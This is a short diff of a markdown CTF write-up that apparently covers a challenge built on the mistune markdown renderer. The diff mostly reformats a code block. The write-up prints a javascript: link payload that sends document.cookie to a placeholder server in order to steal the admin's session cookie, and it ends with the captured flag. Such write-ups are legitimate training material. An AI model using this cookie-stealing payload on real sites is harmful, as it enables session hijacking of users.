@@ -19,8 +19,11 @@ After testing, i will try to get current session to my server before send script
 ```<javascript:document.location='your/server/here/cookie.php?cookie='+document.cookie>``` then i receive this:
 ![Cookie-to-server](https://github.com/quanght55/CTFWriteups/blob/master/hackiu/mistune/images/mistune-get-cookie-test.png)
 Now we are ready to steal admin cookie
-```<javascript:document.location='your/server/here/cookie.php?cookie='+document.cookie>```
-And #BINGO
+```
+<javascript:document.location='your/server/here/cookie.php?cookie='+document.cookie>
+```
+
+And :clap::clap::clap:
 ![Admin-cookie](https://github.com/quanght55/CTFWriteups/blob/master/hackiu/mistune/images/mistune-admin-cookie.png)
 # flag{92da883eb1df9d1287ff25f1a1099f29}
 :smile: :heavy_check_mark:
